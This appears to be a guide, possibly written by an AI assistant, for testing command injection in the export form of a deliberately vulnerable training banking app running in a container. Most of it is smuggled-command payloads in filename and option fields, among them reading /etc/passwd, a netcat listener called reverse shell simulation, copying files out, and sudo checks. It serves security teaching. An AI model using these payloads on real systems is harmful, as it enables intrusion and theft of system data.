Here's how to test the command injection vulnerabilities in the export feature:

## Testing the Command Injection Vulnerabilities

### 1. **Filename Parameter Injection**

**Test Case 1: Basic Command Injection**
- **Filename:** `transactions; ls -la`
- **Expected Result:** The `ls -la` command will execute and show directory contents
- **What happens:** Creates file and then lists directory contents

**Test Case 2: Extract System Information**
- **Filename:** `transactions; whoami; id`
- **Expected Result:** Shows current user and user ID information
- **Command executed:** `mkdir -p /tmp/exports && touch /tmp/exports/transactions; whoami; id.csv`

**Test Case 3: Read System Files**
- **Filename:** `transactions; cat /etc/passwd`
- **Expected Result:** Displays contents of the passwd file (if readable)

### 2. **Compression Parameter Injection**

**Test Case 4: Process Listing**
- **Filename:** `test`
- **Compression:** `ps aux; echo "injected"`
- **Expected Result:** Shows running processes

**Test Case 5: Network Information**
- **Filename:** `test`  
- **Compression:** `netstat -an; echo "network info"`
- **Expected Result:** Displays network connections

### 3. **Custom Options Parameter Injection**

**Test Case 6: Environment Variables**
- **Custom Options:** `env | grep -i user`
- **Expected Result:** Shows user-related environment variables

**Test Case 7: File System Exploration**
- **Custom Options:** `find /tmp -name "*.csv" -ls`
- **Expected Result:** Lists CSV files in /tmp directory

### 4. **Multi-Parameter Injection**

**Test Case 8: Complex Injection**
- **Filename:** `transactions; echo "step1"`
- **Compression:** `echo "step2"; ls /tmp`
- **Custom Options:** `echo "step3"; date`
- **Expected Result:** Executes all three echo commands plus ls and date

## How to Execute Tests

1. **Navigate to Export Page:**
   ```
   http://localhost:5000/export
   ```

2. **Fill in the form with injection payloads**

3. **Click "Generate Export"**

4. **Check the results in:**
   - Flash messages at the top
   - "Export Results" section showing:
     - Command Executed (you'll see the full injected command)
     - System Output (results of your injected commands)
     - Error Details (if commands failed)

## What to Look For

### In the Browser:
- **Command Executed** section shows your injected commands
- **System Output** shows the results of executed commands
- Console logs (F12 Developer Tools) show the DEBUG output

### In the Application Logs:
```bash
# If running with Docker:
docker logs banking-app

# Look for lines like:
DEBUG: Executing export command: mkdir -p /tmp/exports && touch /tmp/exports/transactions; ls -la.csv
```

## Example Successful Injection

**Input:**
- Filename: `transactions; echo "INJECTED SUCCESSFULLY"; uname -a`
- Format: `csv`

**Expected Output in "Command Executed":**
```
mkdir -p /tmp/exports && touch /tmp/exports/transactions; echo "INJECTED SUCCESSFULLY"; uname -a.csv
```

**Expected Output in "System Output":**
```
INJECTED SUCCESSFULLY
Linux banking-app 5.4.0 #1 SMP ... x86_64 GNU/Linux
```

## Advanced Test Cases

### 1. **Reverse Shell Simulation** (Safe for training):
```bash
# Filename: 
transactions; echo "reverse shell attempt"; nc -l 1234 &
```

### 2. **Data Exfiltration Simulation**:
```bash
# Custom Options:
cat /etc/hosts > /tmp/stolen.txt; echo "data exfiltrated"
```

### 3. **Privilege Escalation Attempt**:
```bash
# Compression:
sudo -l; echo "checking privileges"
```

## Safety Notes for Training

- The application runs in a container, so damage is limited
- Commands execute with the application's user privileges (non-root)
- File system access is restricted to the container
- Network access depends on container configuration

## Verifying Injection Success

1. **Check if files were created:**
   ```bash
   docker exec banking-app ls -la /tmp/exports/
   ```

2. **See what commands actually ran:**
   ```bash
   docker exec banking-app ps aux
   ```

3. **Check container logs:**
   ```bash
   docker logs banking-app | grep DEBUG
   ```

This gives you comprehensive testing scenarios to demonstrate how command injection vulnerabilities work and their potential impact in a controlled training environment.